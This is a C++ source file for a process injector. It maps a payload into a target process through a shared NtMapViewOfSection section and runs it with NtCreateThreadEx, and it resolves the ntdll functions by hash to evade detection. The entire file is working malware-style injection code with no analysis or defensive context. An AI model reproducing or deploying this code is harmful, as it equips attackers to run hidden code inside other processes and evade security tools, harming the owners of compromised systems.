// injector.cpp (with NTSTATUS debug)
#include "runtimeAPIhash.h"
#include <winternl.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* fnNtUnmapViewOfSection)(
    HANDLE, PVOID);
typedef NTSTATUS(NTAPI* fnNtCreateThreadEx)(
    PHANDLE            ThreadHandle,        // rcx
    ACCESS_MASK        DesiredAccess,       // rdx
    POBJECT_ATTRIBUTES ObjectAttributes,    // r8
    HANDLE             ProcessHandle,       // r9
    PVOID              StartRoutine,        // stack[0]
    PVOID              Argument,            // stack[1]
    ULONG              CreateFlags,         // stack[2]
    ULONG_PTR          ZeroBits,            // stack[3]
    SIZE_T             StackSize,           // stack[4]
    SIZE_T             MaximumStackSize,    // stack[5]
    PVOID              AttributeList        // stack[6]
    );


BOOL InjectViaSection(HANDLE hProcess, PBYTE payload, SIZE_T size) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto pNtCreateSection = (fnNtCreateSection)GetProcAddressH(hNtdll, NtCreateSection_Hash);
    auto pNtMapViewOfSection = (fnNtMapViewOfSection)GetProcAddressH(hNtdll, NtMapViewOfSection_Hash);
    auto pNtUnmapViewOfSection = (fnNtUnmapViewOfSection)GetProcAddressH(hNtdll, NtUnmapViewOfSection_Hash);
    auto pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddressH(hNtdll, NtCreateThreadEx_Hash);

    NTSTATUS status;
    LARGE_INTEGER secSize; secSize.QuadPart = size;
    HANDLE hSection = NULL;
    status = pNtCreateSection(&hSection,
        SECTION_ALL_ACCESS, NULL, &secSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) { printf("NtCreateSection failed: 0x%08X\n", status); return FALSE; }

    // map local
    PVOID localAddr = NULL; SIZE_T viewSize = size;
    status = pNtMapViewOfSection(
        hSection, GetCurrentProcess(), &localAddr,
        0, size, NULL, &viewSize,
        1/*ViewShare*/, 0, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) { printf("Map local failed: 0x%08X\n", status); return FALSE; }

    memcpy(localAddr, payload, size);

    // map remote
    PVOID remoteAddr = NULL; viewSize = size;
    status = pNtMapViewOfSection(
        hSection, hProcess, &remoteAddr,
        0, size, NULL, &viewSize,
        1/*ViewShare*/, 0, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        printf("Map remote failed: 0x%08X\n", status);
        pNtUnmapViewOfSection(GetCurrentProcess(), localAddr);
        return FALSE;
    }

    // unmap local
    status = pNtUnmapViewOfSection(GetCurrentProcess(), localAddr);
    if (!NT_SUCCESS(status)) printf("Unmap local warning: 0x%08X\n", status);

    // create thread
    HANDLE hThread = NULL;
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS,
        NULL, hProcess, remoteAddr, NULL,
        FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) { printf("NtCreateThreadEx failed: 0x%08X\n", status); return FALSE; }

    CloseHandle(hSection);
    return TRUE;
}
